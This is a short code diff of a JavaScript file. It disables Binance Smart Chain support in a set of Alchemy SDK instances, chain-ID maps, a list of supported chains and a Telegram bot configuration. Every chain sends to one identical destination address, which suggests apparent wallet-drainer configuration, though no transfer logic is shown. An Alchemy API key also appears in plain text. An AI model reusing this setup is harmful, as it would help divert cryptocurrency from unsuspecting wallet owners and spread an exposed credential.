@@ -21,10 +21,10 @@ const alchemyInstances = {
     apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
     network: Network.ETH_MAINNET,
   }),
-  [Network.BSC_MAINNET]: new Alchemy({
-    apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
-    network: Network.BSC_MAINNET,
-  }),
+  // [Network.BSC_MAINNET]: new Alchemy({
+  //   apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
+  //   network: Network.BSC_MAINNET,
+  // }),
   [Network.OPTIMISM]: new Alchemy({
     apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
     network: Network.OPTIMISM,
@@ -47,7 +47,7 @@ const alchemyInstances = {
 // Mapping from chain IDs to Alchemy SDK network enums
 const chainIdToNetworkMap = {
   1: Network.ETH_MAINNET,      // Ethereum Mainnet
-  56: Network.BSC_MAINNET,     // BSC Mainnet
+  // 56: Network.BSC_MAINNET,     // BSC Mainnet
   10: Network.OPTIMISM,        // Optimism Mainnet
   324: Network.ZK_SYNC,        // zkSync Mainnet
   42161: Network.ARB_MAINNET,  // Arbitrum Mainnet
@@ -58,7 +58,7 @@ const chainIdToNetworkMap = {
 // Mapping of chain IDs to destination addresses
 const chainIdToDestinationAddress = {
   1: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Mainnet Address
-  56: '0x933d91B8D5160e302239aE916461B4DC6967815d', // BSC Address
+  // 56: '0x933d91B8D5160e302239aE916461B4DC6967815d', // BSC Address
   10: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Optimism Address
   324: '0x933d91B8D5160e302239aE916461B4DC6967815d', // zkSync Address
   42161: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Arbitrum Address
@@ -66,7 +66,7 @@ const chainIdToDestinationAddress = {
 };
 
 // Supported chain IDs
-const supportedChains = [1, 56, 10, 324, 42161, 137];
+const supportedChains = [1, 10, 324, 42161, 137];
 
 // Telegram bot configuration
 const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
